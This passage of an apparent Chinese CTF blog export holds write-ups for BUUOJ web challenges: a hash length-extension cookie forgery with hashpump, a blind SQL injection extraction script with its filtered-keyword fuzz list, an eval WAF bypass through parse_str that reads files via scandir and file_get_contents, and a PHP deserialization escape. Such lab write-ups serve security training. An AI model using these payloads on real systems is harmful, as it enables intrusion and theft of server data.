<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>
<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>
<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>
<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>
<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>
<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: action&#x3D;readscan; sign&#x3D;0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\n&quot;}</code></p>
<h3 id="0x02-另一种解法"><a href="#0x02-另一种解法" class="headerlink" title="0x02 另一种解法"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>
<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>
<p>求<code>（secret+flag.txt+scanread）</code></p>
<p>经过测试密钥是16位 加上scanread是24位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;tmp&#x2F;HashPump# hashpump </span><br><span class="line">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class="line">Input Data: scan   #写上原有数据</span><br><span class="line">Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度</span><br><span class="line">Input Data to Add: read   #拓展的数据</span><br><span class="line">46a6ff04f7bede58de30e93410935976 #生成的MD5</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>

<p><code>burp suite</code>提交的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie:action&#x3D;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign&#x3D;46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>

<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\n&quot;}</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>De1CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录3</title>
    <url>/2019/12/27/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\t、/**/、()</code>绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class="line">ascii(char)</span><br><span class="line">substr（str,pos,len)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>

<p>访问页面</p>
<p><img src="../pic/3.jpg" alt=""></p>
<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>
<table>
<thead>
<tr>
<th align="center">%20</th>
<th>482</th>
<th>SQL Injection Checked</th>
</tr>
</thead>
<tbody><tr>
<td align="center">AND</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">DELETE</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">END-EXEC</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">GROUP</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">INSERT</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">INTO</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">LIMIT</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">OR</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">UNION</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">UPDATE</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">+</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">/</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">-</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">*</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">`</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">“</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">||</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">%23</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">;</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 12&#x2F;27&#x2F;2019 6:11 PM</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for x in range(1, 43):</span><br><span class="line">    high &#x3D; 126</span><br><span class="line">    low &#x3D; 45</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    while high - low &gt; 1:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x, mid)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        res &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">        if &#39;Hello&#39; in res.text:</span><br><span class="line">            low &#x3D; mid</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    if high - low &#x3D;&#x3D; 1:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&quot; % (x, high)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">        if &#39;Hello&#39; in response.text:</span><br><span class="line">            result +&#x3D; chr(int(mid+1))</span><br><span class="line">        else :</span><br><span class="line">            result +&#x3D; chr(int(mid))</span><br><span class="line">    else :</span><br><span class="line">        result +&#x3D; chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;a</span><br><span class="line">flag&#123;a2</span><br><span class="line">flag&#123;a22</span><br><span class="line">flag&#123;a22c</span><br><span class="line">flag&#123;a22cf</span><br><span class="line">flag&#123;a22cf6</span><br><span class="line">flag&#123;a22cf69</span><br><span class="line">flag&#123;a22cf690</span><br><span class="line">flag&#123;a22cf690-</span><br><span class="line">flag&#123;a22cf690-3</span><br><span class="line">flag&#123;a22cf690-34</span><br><span class="line">flag&#123;a22cf690-342</span><br><span class="line">flag&#123;a22cf690-342a</span><br><span class="line">flag&#123;a22cf690-342a-</span><br><span class="line">flag&#123;a22cf690-342a-4</span><br><span class="line">flag&#123;a22cf690-342a-4b</span><br><span class="line">flag&#123;a22cf690-342a-4bf</span><br><span class="line">flag&#123;a22cf690-342a-4bf4</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-8</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-88</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>

<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ciscn</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录2</title>
    <url>/2019/12/26/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
    <content><![CDATA[<h2 id="Roarctf-easy-calc"><a href="#Roarctf-easy-calc" class="headerlink" title="[Roarctf]easy_calc"></a>[Roarctf]easy_calc</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br></pre></td></tr></table></figure>

<p>目录扫描函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scandir()</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>字符转换函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class="line">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>

<p>输出函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump()</span><br><span class="line">printf()</span><br></pre></td></tr></table></figure>

<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>
<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+encodeURIComponent($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span><br><span class="line">                $("#result").html(`&lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>进入calc.php,进行代码审计。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;    </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);<span class="comment">//如果包含黑名单中的字符，程序退出</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入url编码后的。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，详细介绍查看<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">参考连接</a>。</p>
<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>

<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>buuoj</tag>
        <tag>web</tag>
        <tag>Roarctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录1</title>
    <url>/2019/12/23/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    <content><![CDATA[<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<p>PHP序列化<a href="https://www.php.cn/php-notebook-239422.html" target="_blank" rel="noopener">参考文章</a></p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class="line">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class="line">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    $flag &#x3D; &#39;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>查看index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">			header(<span class="string">'Location: profile.php'</span>);<span class="comment">//登入后跳转到profile.php</span></span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>查看profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;   </span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123; </span><br><span class="line">    header(<span class="string">'Location: update.php'</span>); <span class="comment">//$profile为空，跳转到update.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    $profile = unserialize($profile); <span class="comment">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));<span class="comment">//file_get_contents()此函数可以获得文件内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">    $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">    $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">    $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">    $user-&gt;update_profile($username, serialize($profile));<span class="comment">//将$profile序列化，执行过滤函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看update_profile()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile); </span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看filter()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); </span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; </span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//将  “ ‘ ”、 “\\\\” 替换成 “_” </span></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//将“ select|insert|update|delete|where” 替换成 "hacker"，返回替换后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在update_profile()，返回到profile.php.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile); <span class="comment">//反序列化$profile</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>序列化后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>要让$photo得到的文件是config.php也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>
<p>变成 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>
<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>
<p>因为nickname有长度限制使用数组可以绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>
<h3 id="0x03-开始操作"><a href="#0x03-开始操作" class="headerlink" title="0x03 开始操作"></a>0x03 开始操作</h3><p><img src="../pic/1.png" alt="1"> 传入参数</p>
